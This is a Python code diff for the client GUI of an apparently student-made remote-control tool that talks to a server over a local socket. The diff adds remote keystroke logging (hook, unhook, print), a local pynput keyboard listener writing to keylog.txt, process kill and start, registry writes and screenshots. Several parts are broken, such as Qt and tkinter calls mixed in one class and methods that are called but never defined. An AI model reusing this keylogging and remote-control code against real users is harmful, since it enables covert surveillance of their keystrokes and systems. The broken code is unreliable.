@@ -4,15 +4,17 @@ from PIL import Image, ImageTk
 from PyQt6.QtCore import Qt, QBuffer
 from PyQt6.QtGui import QPixmap, QImage, QColor, QPainter
 from PyQt6.QtWidgets import QApplication, QWidget, QPushButton, QVBoxLayout, QHBoxLayout, QTabWidget, QLabel, \
-    QMessageBox, QFileDialog
+    QMessageBox, QFileDialog, QtWidgets
 import io
 from io import BytesIO
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox
+import pynput.keyboard
+from io import StringIO
 
 HOST = "127.0.1.1"
 PORT = 64444
-img_bytes = b'\x00\x01\x02...'  
+img_bytes = b'\x00\x01\x02...'
 # Replace with actual binary image data
 
 
@@ -75,6 +77,204 @@ class Account:
             return False
 
 
+class Keylog(QtWidgets.QWidget):
+    def __init__(self, client):
+        self.client = client
+        self.init_ui()
+
+    def init_ui(self):
+        # ... (your existing init_ui function)
+        self.button1 = QtWidgets.QPushButton('HOOK', self)
+        self.button1.clicked.connect(self.hook_button_clicked)
+
+        self.button2 = QtWidgets.QPushButton('UNHOOK', self)
+        self.button2.clicked.connect(self.unhook_button_clicked)
+
+        self.button3 = QtWidgets.QPushButton('PRINT', self)
+        self.button3.clicked.connect(self.print_button_clicked)
+
+        self.txtKQ = QtWidgets.QTextEdit(self)
+
+        self.butXoa = QtWidgets.QPushButton('Clear', self)
+        self.butXoa.clicked.connect(self.clear_button_clicked)
+
+        layout = QtWidgets.QVBoxLayout()
+        layout.addWidget(self.button1)
+        layout.addWidget(self.button2)
+        layout.addWidget(self.button3)
+        layout.addWidget(self.txtKQ)
+        layout.addWidget(self.butXoa)
+
+        self.setLayout(layout)
+        self.setWindowTitle('Keylog')
+
+    def hook_button_clicked(self):
+        command = "HOOK\n"
+        # You need to send this data to the server here
+        self.client.send_command(command)
+        pass
+
+    def unhook_button_clicked(self):
+        command = "UNHOOK\n"
+        # You need to send this data to the server here
+        self.client.send_command(command)
+        pass
+
+    def print_button_clicked(self):
+        command = "PRINT\n"
+        self.client.send_command(command)
+        data = self.client.receive_data()  # Replace with actual receive logic
+        text = ''.join(data)
+        self.txtKQ.insert(tk.END, text)
+
+    def clear_button_clicked(self):
+        self.txtKQ.delete('1.0', tk.END)
+
+    def run(self):
+        self.root.mainloop()
+
+
+class Process:
+    def __init__(self, client):
+        self.client = client
+
+        def kill_click():
+            try:
+                self.client.send_data("KILL")
+                view_kill = Kill(self.client)
+                view_kill.run()
+            except Exception as ex:
+                messagebox.showerror("Error", str(ex))
+
+        def view_click():
+            try:
+                self.client.send_data("XEM")
+                soprocess = int(self.client.receive_data())
+                for _ in range(soprocess):
+                    s1 = self.client.receive_data()
+                    s2 = self.client.receive_data()
+                    s3 = self.client.receive_data()
+                    one = (s1, s2, s3)
+                    self.process_list.insert("", "end", values=one)
+            except Exception as ex:
+                messagebox.showerror("Error", str(ex))
+
+        def start_click():
+            try:
+                self.client.send_data("START")
+                view_start = Start(self.client)
+                view_start.run()
+            except Exception as ex:
+                messagebox.showerror("Error", str(ex))
+
+        def delete_click():
+            if self.process_list.selection():
+                selected_item = self.process_list.selection()[0]
+                self.process_list.delete(selected_item)
+
+        # Buttons
+        kill_button = tk.Button(
+            self, text="Kill", width=10, command=kill_click)
+        kill_button.grid(row=0, column=0, padx=10, pady=10)
+
+        view_button = tk.Button(self, text="Xem", width=10, command=view_click)
+        view_button.grid(row=0, column=1, padx=10, pady=10)
+
+        start_button = tk.Button(
+            self, text="Start", width=10, command=start_click)
+        start_button.grid(row=0, column=2, padx=10, pady=10)
+
+        delete_button = tk.Button(
+            self, text="Xóa", width=10, command=delete_click)
+        delete_button.grid(row=0, column=3, padx=10, pady=10)
+
+        # TreeView for Process List
+        self.process_list = ttk.Treeview(self, columns=(
+            "Name Process", "ID Process", "Count Thread"), show="headings")
+        self.process_list.heading("#1", text="Name Process")
+        self.process_list.heading("#2", text="ID Process")
+        self.process_list.heading("#3", text="Count Thread")
+        self.process_list.grid(row=1, column=0, columnspan=4, padx=20, pady=20)
+
+        # ... (other widgets and settings)
+
+        self.protocol("WM_DELETE_WINDOW", self.process_closing)
+
+    def process_closing(self):
+        self.client.send_data("QUIT")
+        self.client.close()
+        self.destroy()
+
+class Start(tk.Tk):
+    def __init__(self, client):
+        super().__init__()
+
+        self.client = client
+
+        self.title("Start")
+
+        self.protocol("WM_DELETE_WINDOW", self.start_closing)
+
+        self.label = tk.Label(self, text="Enter ID:")
+        self.label.grid(row=0, column=0, padx=10, pady=10)
+
+        self.txtID = tk.Entry(self, width=20)
+        self.txtID.grid(row=0, column=1, padx=10, pady=10)
+
+        self.butStart = tk.Button(self, text="Start", width=10, command=self.butStart_click)
+        self.butStart.grid(row=0, column=2, padx=10, pady=10)
+
+    def start_closing(self):
+        try:
+            self.client.send_command("QUIT")
+        except Exception as ex:
+            pass
+        self.destroy()
+
+    def butStart_click(self):
+        try:
+            self.client.send_command("STARTID")
+            self.client.send_data(self.txtID.get())
+            response = self.client.receive_data()
+            messagebox.showinfo("Start Result", response)
+        except Exception as ex:
+            messagebox.showerror("Error", str(ex))
+
+class Kill(tk.Toplevel):
+    def __init__(self, client):
+        super().__init__()
+
+        self.client = client
+
+        self.title("Kill")
+
+        self.protocol("WM_DELETE_WINDOW", self.kill_closing)
+
+        self.label = tk.Label(self, text="Enter ID:")
+        self.label.grid(row=0, column=0, padx=10, pady=10)
+
+        self.txtID = tk.Entry(self, width=20)
+        self.txtID.grid(row=0, column=1, padx=10, pady=10)
+
+        self.butNhap = tk.Button(self, text="Kill", width=10, command=self.butNhap_click)
+        self.butNhap.grid(row=0, column=2, padx=10, pady=10)
+
+    def butNhap_click(self):
+        try:
+            self.client.send_command("KILLID")
+            self.client.send_data(self.txtID.get())
+            response = self.client.receive_data()
+            messagebox.showinfo("Kill Result", response)
+        except Exception as ex:
+            messagebox.showerror("Error", str(ex))
+
+    def kill_closing(self):
+        try:
+            self.client.send_command("QUIT")
+        except Exception as ex:
+            pass
+        self.destroy()
+
 class Client:
     def __init__(self, host, port):
         self.host = host
@@ -90,29 +290,55 @@ class Client:
         try:
             self.Cli_Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.Cli_Sock.connect((ip, self.port))
-            self.network_file = self.Cli_Sock.makefile('rw')
+            self.ns = self.Cli_Sock.makefile('rwb')
+            self.nr = self.ns.makefile('r')
+            self.nw = self.ns.makefile('w')
             messagebox.showinfo(
                 "Connected", "Connected to the server successfully")
         except socket.error as ex:
             messagebox.showerror(
                 "Error", f"Failed to connect to the server: {ex}")
             self.Cli_Sock = None
-            self.network_file = None
+            self.ns = None
+            self.nr = None
+            self.nw = None
 
     def send_command(self, command):
-        """Send a command to the server."""
         if self.Cli_Sock is None:
             messagebox.showerror("Error", "Not connected to the server")
             return
         try:
-            self.network_file.write(command + "\n")
-            self.network_file.flush()
+            self.nw.write((command + "\n").encode())
+            self.nw.flush()
         except socket.timeout as ex:
-            messagebox.showerror(
-                "Error", f"Timeout while sending command to the server: {ex}")
+            messagebox.showerror("Error", f"Timeout: {ex}")
         except socket.error as ex:
-            messagebox.showerror(
-                "Error", f"Failed to send command to the server: {ex}")
+            messagebox.showerror("Error", f"Error sending command: {ex}")
+
+    def send_data(self, data):
+        if self.Cli_Sock is None:
+            messagebox.showerror("Error", "Not connected to the server")
+            return
+        try:
+            self.nw.write((data + "\n").encode())
+            self.nw.flush()
+        except socket.timeout as ex:
+            messagebox.showerror("Error", f"Timeout: {ex}")
+        except socket.error as ex:
+            messagebox.showerror("Error", f"Error sending data: {ex}")
+
+    def receive_data(self):
+        if self.Cli_Sock is None:
+            messagebox.showerror("Error", "Not connected to the server")
+            return ""
+        try:
+            return self.nr.readline().decode().strip()
+        except socket.timeout as ex:
+            messagebox.showerror("Error", f"Timeout: {ex}")
+            return ""
+        except socket.error as ex:
+            messagebox.showerror("Error", f"Error receiving data: {ex}")
+            return ""
 
     def handle_response(self, res):
         """Handle the response from the server based on the response type."""
@@ -264,6 +490,7 @@ def blank():
 
     root.mainloop()
 
+
 # Create the main GUI window
 
 
@@ -326,50 +553,7 @@ class GUI:
         root.mainloop()
 
     def processScene(self):
-        process_window = tk.Tk()
-        process_window.title("Process")
-
-        def kill_click():
-            # Implement the kill action
-            pass
-
-        def view_click():
-            # Implement the view action
-            pass
-
-        def start_click():
-            # Implement the start action
-            pass
-
-        def delete_click():
-            # Implement the delete action
-            pass
-
-        # Buttons
-        kill_button = tk.Button(
-            process_window, text="Kill", width=10, command=kill_click)
-        kill_button.grid(row=0, column=0, padx=10, pady=10)
-
-        view_button = tk.Button(
-            process_window, text="Xem", width=10, command=view_click)
-        view_button.grid(row=0, column=1, padx=10, pady=10)
-
-        delete_button = tk.Button(
-            process_window, text="Xóa", width=10, command=delete_click)
-        delete_button.grid(row=0, column=2, padx=10, pady=10)
-
-        start_button = tk.Button(
-            process_window, text="Start", width=10, command=start_click)
-        start_button.grid(row=0, column=3, padx=10, pady=10)
-
-        # TreeView
-        process_list = ttk.Treeview(process_window, columns=(
-            "Name Process", "ID Process", "Count Thread"), show="headings")
-        process_list.heading("#1", text="Name Process")
-        process_list.heading("#2", text="ID Process")
-        process_list.heading("#3", text="Count Thread")
-        process_list.grid(row=1, column=0, columnspan=4, padx=20, pady=20)
-
+        process_window = Process(self.client)
         process_window.mainloop()
 
     def appScene(self):
@@ -378,45 +562,60 @@ class GUI:
         app_window.title("App")
 
         def kill_click():
-            # Implement the kill action
-            pass
+            try:
+                self.client.send_data("KILL")
+                view_kill = Kill(self.client)
+                view_kill.run()
+            except Exception as ex:
+                messagebox.showerror("Error", str(ex))
 
         def view_click():
-            # Implement the view action
-            pass
+            try:
+                self.client.send_data("XEM")
+                soprocess = int(self.client.receive_data())
+                for _ in range(soprocess):
+                    s1 = self.client.receive_data()
+                    if s1 == "ok":
+                        s1 = self.client.receive_data()
+                        s2 = self.client.receive_data()
+                        s3 = self.client.receive_data()
+                        one = (s1, s2, s3)
+                        self.app_list.insert("", "end", values=one)
+            except Exception as ex:
+                messagebox.showerror("Error", str(ex))
 
         def start_click():
-            # Implement the start action
-            pass
+            try:
+                self.client.send_data("START")
+                view_start = Start(self.client)
+                view_start.run()
+            except Exception as ex:
+                messagebox.showerror("Error", str(ex))
 
         def delete_click():
             # Implement the delete action
             pass
 
+        # TreeView for App List
+        self.app_list = ttk.Treeview(app_window, columns=(
+            "Name App", "ID App", "Count Thread"), show="headings")
+        self.app_list.heading("#1", text="Name App")
+        self.app_list.heading("#2", text="ID App")
+        self.app_list.heading("#3", text="Count Thread")
+        self.app_list.grid(row=1, column=0, columnspan=4, padx=20, pady=20)
+
         # Buttons
-        kill_button = tk.Button(
-            app_window, text="Kill", width=10, command=kill_click)
+        kill_button = tk.Button(app_window, text="Kill",
+                                width=10, command=kill_click)
         kill_button.grid(row=0, column=0, padx=10, pady=10)
 
-        view_button = tk.Button(
-            app_window, text="Xem", width=10, command=view_click)
+        view_button = tk.Button(app_window, text="Xem",
+                                width=10, command=view_click)
         view_button.grid(row=0, column=1, padx=10, pady=10)
-
-        delete_button = tk.Button(
-            app_window, text="Xóa", width=10, command=delete_click)
-        delete_button.grid(row=0, column=2, padx=10, pady=10)
 
         start_button = tk.Button(
             app_window, text="Start", width=10, command=start_click)
-        start_button.grid(row=0, column=3, padx=10, pady=10)
-
-        # TreeView
-        app_list = ttk.Treeview(app_window, columns=(
-            "Name App", "ID App", "Count Thread"), show="headings")
-        app_list.heading("#1", text="Name App")
-        app_list.heading("#2", text="ID App")
-        app_list.heading("#3", text="Count Thread")
-        app_list.grid(row=1, column=0, columnspan=4, padx=20, pady=20)
+        start_button.grid(row=0, column=2, padx=10, pady=10)
 
         app_window.mainloop()
 
@@ -426,20 +625,30 @@ class GUI:
         key_window.title("Keystroke Log")
 
         def hook_click():
-            # Implement the hook action
-            pass
+            self.key_listener = pynput.keyboard.Listener(
+                on_press=self.on_key_press)
+            self.key_listener.start()
 
         def unhook_click():
-            # Implement the unhook action
-            pass
+            if hasattr(self, 'key_listener'):
+                self.key_listener.stop()
 
         def print_click():
-            # Implement the print action
-            pass
+            try:
+                with open("keylog.txt", "r") as f:
+                    keystrokes = f.read()
+                    self.txtKQ.delete(1.0, tk.END)  # Clear existing text
+                    self.txtKQ.insert(tk.END, keystrokes)
+            except Exception as e:
+                print(str(e))
 
         def delete_click():
-            # Implement the delete action
-            pass
+            try:
+                with open("keylog.txt", "w") as f:
+                    f.truncate(0)  # Clear the file content
+                self.txtKQ.delete(1.0, tk.END)  # Clear the Text widget
+            except Exception as e:
+                print(str(e))
 
         # Buttons
         hook_button = tk.Button(
@@ -459,9 +668,8 @@ class GUI:
         start_button.grid(row=0, column=3, padx=10, pady=10)
 
         # KeyLog text box
-        Text = "Thay cái này bằng trong code bằng câu lệnh cho biết text người bên server dùng nhập"
-
-        key_list = ttk.Label(key_window, Text)
+        self.txtKQ = tk.Text(key_window, width=50, height=20)
+        self.txtKQ.grid(row=1, column=0, columnspan=4, padx=20, pady=20)
 
         key_window.mainloop()
 
@@ -471,19 +679,49 @@ class GUI:
         self.root.title("Registry")
 
         def butSend_click():
-            # Implement the send action
-            pass
+            operation = self.opApp.get()
+            link = self.txtLink.get()
+            name_value = self.txtNameValue.get()
+            value = self.txtValue.get()
+            type_value = self.opTypeValue.get()
+
+            # Send data to the server and receive response
+            self.client.send_command("SEND")
+            self.client.send_data(operation)
+            self.client.send_data(link)
+            self.client.send_data(name_value)
+            self.client.send_data(value)
+            self.client.send_data(type_value)
+            response = self.client.receive_data()
+
+            # Update the result textbox
+            self.txtKQ.insert(tk.END, response + "\n")            
 
         def butBro_click():
-            # Implement the browser action
-            pass
+            try:
+                # Open the file dialog to choose a .reg file
+                file_path = filedialog.askopenfilename(filetypes=[("Registry Files", "*.reg")])
+
+                if file_path:
+                    # Update the file path in the entry widget
+                    self.txtBro.delete(0, tk.END)  # Clear existing content
+                    self.txtBro.insert(0, file_path)
+
+                    # Read the content of the selected file and populate the text box
+                    with open(file_path, "r") as file:
+                        reg_content = file.read()
+                        self.txtReg.delete(1.0, tk.END)  # Clear existing content
+                        self.txtReg.insert(tk.END, reg_content)
+            except Exception as e:
+                messagebox.showerror("Error", str(e))
+
 
         def button1_click():
-            # Implement the button1 action
             pass
 
+
         def butXoa_click():
-            # Implement the Xóa action
+            self.txtKQ.delete(1.0, tk.END)
             pass
 
         self.butBro = tk.Button(
@@ -573,7 +811,7 @@ class GUI:
             tab_label.pack()
 
             save_btn = ttk.Button(
-                new_tab, text="Save", command=lambda: self.save_screenshot(img_bytes))
+                new_tab, text="Save", command=lambda: self.buttonSAVE_click(img_bytes))
             save_btn.pack()
 
             self.tabs.add(new_tab, text="Screenshot")
